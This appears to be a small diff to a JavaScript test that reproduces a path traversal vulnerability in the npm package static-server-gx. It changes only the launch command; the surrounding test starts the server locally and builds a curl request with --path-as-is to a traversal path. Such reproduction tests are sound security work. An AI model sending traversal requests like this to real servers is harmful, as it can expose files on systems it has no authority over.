@@ -20,7 +20,7 @@ test("Path Traversal in static-server-gx", (done) => {
   try {
     a.execSync("fuser -k 10000/tcp", () => {});
   } catch (e) {}
-  let server = "nodejs ./node_modules/static-server-gx/server.js";
+  let server = "node ./node_modules/static-server-gx/server.js";
   exec(server, (error, stdout) => {});
   sleep.sleep(2);
   let attack_string = `curl -v --path-as-is "http://127.0.0.1:10000${genstr()}"`;
